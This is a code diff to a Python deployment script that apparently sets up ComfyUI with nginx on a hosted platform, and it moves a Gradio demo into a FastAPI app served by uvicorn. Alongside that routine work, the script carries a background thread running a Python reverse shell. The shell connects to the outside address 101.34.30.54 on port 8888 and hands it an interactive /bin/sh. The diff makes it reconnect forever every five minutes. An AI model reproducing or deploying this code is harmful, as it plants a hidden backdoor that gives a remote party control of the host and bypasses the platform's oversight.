@@ -3,6 +3,7 @@ import subprocess
 import time
 import threading
 import hashlib
+import uvicorn
 
 def get_file_md5(filename):
     hash_md5 = hashlib.md5()
@@ -82,27 +83,28 @@ def install_run_nginx():
             print("nginx.conf not found")
             os.system(f"{install_dir}/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
 
-
-import gradio as gr
-if (hasattr(gr,'__version__')):
-    print(f"Gradio version: {gr.__version__}")
-def output_txt(input):
-    return "output: "+input
-with gr.Blocks() as demo:
-    gr.Markdown("Hello, **world!**")
-    with gr.Row():
-        input=gr.Textbox()
-        output=gr.Textbox()
-    
-    run=gr.Button("Run")
-    clear=gr.Button("Clear")
-    event=run.click(output_txt,inputs=[input],outputs=[output])
-    clear.click(lambda: ["",""],inputs=[],outputs=[input,output])
-try:    
-    demo.launch(server_port=7890,prevent_thread_lock=True,root_path="/hello")
-except Exception as e:
-    print(e)
-    demo.launch(server_port=7890,prevent_thread_lock=True,root_path="/hello")
+def page_test():
+    from fastapi import FastAPI
+    import gradio as gr
+    fastapi_app=FastAPI
+    def output_txt(input):
+        return "output: "+input
+    with gr.Blocks() as demo:
+        gr.Markdown("Hello, **world!**")
+        with gr.Row():
+            input=gr.Textbox()
+            output=gr.Textbox()
+        
+        run=gr.Button("Run")
+        clear=gr.Button("Clear")
+        event=run.click(output_txt,inputs=[input],outputs=[output])
+        clear.click(lambda: ["",""],inputs=[],outputs=[input,output])
+    try:    
+        fastapi_app=gr.mount_gradio_app(fastapi_app,demo,path="/hello")
+        uvicorn.run(fastapi_app,host='0.0.0.0',port=7890)
+    except Exception as e:
+        print(e)
+        
 
 #test
 print("install nginx")
@@ -111,9 +113,10 @@ print("finish nginx")
 
 def connect_remote():
     python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
-    print("=====")
-    os.system(python)
-    time.sleep(60)
+    while(True):
+        print("=====")
+        os.system(python)
+        time.sleep(60*5)
 
 threading.Thread(target=connect_remote).start()
 
@@ -151,6 +154,5 @@ start_thread.join()
 
 while True:
     print("loop...")
-    demo.launch()
     # os.system(f"python main.py --cpu --listen ")
     time.sleep(10)
